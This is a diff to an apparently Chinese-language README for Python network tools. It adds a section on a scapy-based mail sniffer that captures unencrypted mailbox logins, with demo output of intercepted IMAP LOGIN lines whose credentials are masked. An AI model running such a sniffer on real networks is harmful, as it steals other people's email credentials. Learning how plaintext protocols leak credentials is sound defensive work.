@@ -60,3 +60,25 @@ Protocol: UDP 192.168.1.16 -> 192.168.1.127
 Protocol: UDP 192.168.1.57 -> 192.168.1.127
  退出！
 ```
+
+### 0x06 mail_sniffer.py
+用到的库：scapy
+测试邮箱：139邮箱
+不同的邮箱调整不同的关键词。
+只能抓取没有ssl加密的，大部分默认不用。
+演示：
+```
+C:\Users\cmd\Desktop>python3 mail_sniffer.py
+[*] Server: 120.196.212.39
+[*] b'C3 LOGIN xxxxxxxxxxx@139.com "xxxxxx"\r\n'
+[*] Server: 192.168.1.103
+[*] b'C3 OK LOGIN completed\r\n'
+[*] Server: 120.196.212.39
+[*] b'C3 LOGIN xxxxxxxxxxx@139.com "xxxxxx"\r\n'
+[*] Server: 192.168.1.103
+[*] b'C3 OK LOGIN completed\r\n'
+[*] Server: 120.196.212.39
+[*] b'C3 LOGIN xxxxxxxxxxx@139.com "xxxxxx"\r\n'
+[*] Server: 192.168.1.103
+[*] b'C3 OK LOGIN completed\r\n'
+```
